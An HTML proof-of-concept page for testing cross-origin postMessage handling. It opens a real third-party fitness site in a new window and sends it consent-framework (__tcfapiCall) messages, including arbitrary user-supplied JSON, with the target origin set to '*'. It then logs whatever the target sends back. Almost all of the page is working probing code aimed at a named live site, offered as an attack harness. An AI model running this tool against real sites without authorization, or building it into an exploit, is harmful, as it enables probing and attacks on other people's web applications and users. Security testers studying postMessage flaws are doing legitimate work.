<!doctype html>
<html lang="es">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>open-window PoC — postMessage</title>
  <style>
    body{font-family:system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding:18px}
    label,input,button{font:inherit}
    input{padding:6px;border:1px solid #ccc;border-radius:6px}
    button{padding:8px 12px;margin-right:8px;border-radius:6px;border:1px solid #ccc;background:#f3f4f6}
    pre{background:#f6f8fa;padding:8px;height:220px;overflow:auto;border-radius:6px}
    .row{display:flex;gap:8px;align-items:center}
    .small{font-size:13px;color:#555}
  </style>
</head>
<body>
  <h2>Open-window PoC</h2>
  <p class="small">Open the target page in a new window and send <code>postMessage</code> from your origin. Safe by default: only sends JSON strings and includes helpers to send a <code>test</code> payload.</p>

  <label style="display:block;margin-bottom:8px">
    Target (URL to open):
    <input id="t" value="https://www.myfitnesspal.com/apps" style="width:70%;margin-left:8px" />
  </label>

  <div style="margin:8px 0" class="row">
    <button id="o">Open target (new window)</button>
    <button id="s" disabled>Send postMessage (ping)</button>
    <button id="u" disabled>Send postMessage (test with URL)</button>
    <button id="custom" disabled>Send custom JSON</button>
  </div>

  <div style="margin:8px 0;">
    <label class="small">Custom JSON payload (will be stringified):</label>
    <textarea id="customPayload" style="width:100%;height:80px;padding:8px;border-radius:6px;border:1px solid #ccc">{"__tcfapiCall":{"command":"ping","version":2,"callId":"poc-openwin"}}</textarea>
  </div>

  <pre id="log">log</pre>

  <script>
    let w;
    const logEl = document.getElementById('log');
    function log(){
      const args = Array.from(arguments).map(a => typeof a==='object'?JSON.stringify(a):String(a));
      const now = new Date().toISOString();
      logEl.textContent = (logEl.textContent==='log' ? '' : logEl.textContent + '\n') + now + '  ' + args.join(' ');
      logEl.scrollTop = logEl.scrollHeight;
    }

    // Open target window and keep reference
    document.getElementById('o').addEventListener('click', () => {
      const url = document.getElementById('t').value.trim();
      if(!url) return alert('Please enter a target URL');
      // try to open and store reference
      try {
        w = window.open(url, '_blank');
        // store on both windows if possible so the send script can find it
        window._openedPoCTarget = w;
        log('opened', url, '(allow popup if blocked)');
        setTimeout(()=>{ document.getElementById('s').disabled = false; document.getElementById('u').disabled=false; document.getElementById('custom').disabled=false; }, 1200);
      } catch(err){ log('open error', err); }
    });

    // helper to get current target reference (tries a few fallbacks)
    function getTargetWindow(){
      if(w && !w.closed) return w;
      if(window._openedPoCTarget && !window._openedPoCTarget.closed) return window._openedPoCTarget;
      // try to find a window with same origin (best-effort, may fail)
      try{
        for(const name in window.frames){ const f = window.frames[name]; if(f && f.location && typeof f.location.href==='string') return f; }
      }catch(e){}
      return null;
    }

    function sendPayload(obj){
      const target = getTargetWindow();
      if(!target) { log('no target window reference found. Open the target first with "Open target (new window)".'); return; }
      const str = JSON.stringify(obj);
      try{
        target.postMessage(str, '*');
        log('sent payload', obj);
      }catch(err){ log('postMessage failed', err); }
    }

    document.getElementById('s').addEventListener('click', () => {
      sendPayload({ __tcfapiCall: { command: "ping", version: 2, callId: "poc-openwin" }});
    });

    document.getElementById('u').addEventListener('click', () => {
      sendPayload({ __tcfapiCall: { command: "test", parameter: { url: "https://example.com/?poc=marker" }, callId: "poc-test-url-" + Date.now() }});
    });

    document.getElementById('custom').addEventListener('click', () => {
      let raw = document.getElementById('customPayload').value;
      try{
        const parsed = JSON.parse(raw);
        sendPayload(parsed);
      }catch(err){
        // if not JSON, attempt to send as string
        if(raw && raw.trim()){
          const fallback = raw;
          const target = getTargetWindow();
          if(!target){ log('no target window ref — cannot send raw string'); return; }
          try{ target.postMessage(fallback, '*'); log('sent raw string payload'); }catch(e){ log('postMessage fail', e); }
        } else {
          log('custom payload is empty or invalid JSON');
        }
      }
    });

    // receive messages back in PoC
    window.addEventListener('message', (e) => {
      try{ log('recv from', e.origin, 'data=', e.data); }catch(err){ log('recv error', err); }
    }, false);

    // quick status on load
    log('ready — set target URL and click Open target');
  </script>
</body>
</html>
